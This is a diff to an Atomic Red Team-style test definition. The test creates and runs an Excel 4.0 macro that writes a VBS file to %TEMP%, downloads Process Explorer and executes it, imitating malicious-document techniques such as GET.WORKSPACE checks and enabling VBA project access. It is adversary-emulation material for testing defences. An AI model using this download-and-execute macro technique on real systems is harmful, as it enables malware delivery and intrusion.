@@ -144,9 +144,9 @@ atomic_tests:
     This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a "malicious"
     VBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.
 
-    A note regarding this module. Ensure that the username associated Office is the same as the user ID on the system. "=GET.WORKSPACE(26)"
-    requires that Files -> Options -> User Name matches the system username. Otherwise this will break the pathing. If this does not match,
-    use the `uname` parameter
+    A note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If
+    you'd like to utilize the "=GET.WORKSPACE(26)" method, that many maldoc authors use, you will need to ensure that the User Name associated
+    with Excel matches that of the local system. This username can be found under Files -> Options -> Username
   supported_platforms:
   - windows
   input_arguments:
@@ -157,7 +157,7 @@ atomic_tests:
     ms_office_version:
       description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
       type: String
-      default: "15.0"
+      default: $(((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0])
     download_url:
       description: Download URL
       type: String
@@ -165,7 +165,7 @@ atomic_tests:
     uname:
       description: Username for pathing
       type: String
-      default: ""
+      default: $env:Username
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -177,16 +177,25 @@ atomic_tests:
       Stop-Process -Name EXCEL
   executor:
     command: |
+      $fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"
+      $fname1 = "$env:TEMP\procexp.exe"
+      if (Test-Path $fname) {
+        Remove-Item $fname
+        Remove-Item $fname1
+      }
+
       $xlApp = New-Object -COMObject "Excel.Application"
       $xlApp.Visible = $True
       $xlApp.DisplayAlerts = $False
       $xlBook = $xlApp.Workbooks.Add()
       $sheet = $xlBook.Excel4MacroSheets.Add()
-      if ("#{uname}" -eq "") {
-        $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
-      } else {
+
+      if ("#{uname}" -ne "") {
         $sheet.Cells.Item(1,1) = "#{uname}"
+      } else {
+        $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
       }
+
       $sheet.Cells.Item(2,1) = "procexp.exe"
       $sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"
       $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
@@ -212,6 +221,20 @@ atomic_tests:
       $sheet.Cells.Item(1,1).Name = "runme"
       $xlApp.Run("runme")
       $xlApp.Quit()
+
+      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
+      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
+      [System.GC]::Collect()
+      [System.GC]::WaitForPendingFinalizers()
+
+      Remove-Variable xlBook
+      Remove-Variable xlApp
     cleanup_command: |
       Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+      $fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"
+      $fname1 = "$env:TEMP\procexp.exe"
+      if (Test-Path $fname) {
+        Remove-Item $fname
+        Remove-Item $fname1
+      }
     name: powershell
